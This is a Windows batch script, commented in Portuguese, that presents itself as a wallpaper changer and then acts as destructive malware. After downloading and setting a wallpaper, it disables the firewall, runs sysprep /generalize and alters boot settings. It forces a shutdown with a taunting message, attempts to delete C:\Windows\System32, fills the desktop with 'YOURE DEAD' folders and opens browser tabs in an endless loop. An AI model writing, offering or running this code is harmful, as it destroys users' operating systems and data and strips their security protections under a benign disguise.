@echo off

:: URL da imagem (link direto para a imagem)
set image_url=https://wallpapercave.com/wp/wp6270593.jpg

:: Caminho para salvar a imagem
set image_path=%USERPROFILE%\Pictures\wallpaper.jpg

:: Baixar a imagem para a pasta Pictures
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%image_url%', '%image_path%')"

:: Alterar o wallpaper
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%image_path%" /f

:: Atualizar o wallpaper
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

echo O wallpaper foi alterado com sucesso!
pause

::Desativa Segurança 
netsh advfirewall set allprofiles state off
net user administrator /active:no
sysprep /generalize
bcdedit /set {bootmgr} timeout 0

start https://m.youtube.com/watch?v=QRbMnlncGkQ&pp=ygUPdmlydXMgdHlwZSBiZWF0
start notepad
echo YOUR PC WAS BEEN TRASHED BY CORRUPT-X > temp.txt
start notepad temp.txt

:: Customizando a mensagem de desligamento
shutdown /s /t 120 /f /c "YOUR PC ARE TRASHED"

pause

:: Espera 116 segundos antes de executar o comando destrutivo
timeout /t 116

:: Exclui os arquivos do diretório System32 (perigosamente)
rd /s /q C:\Windows\System32

:: Criando 102 pastas na Área de Trabalho com o nome "YOURE DEAD"
set desktop=%USERPROFILE%\Desktop
for /L %%i in (1,1,102) do mkdir "%desktop%\YOURE DEAD%%i"

:loop
start https://www.google.com/search?q=como+saber+seu+pc+tem+virus
goto loop
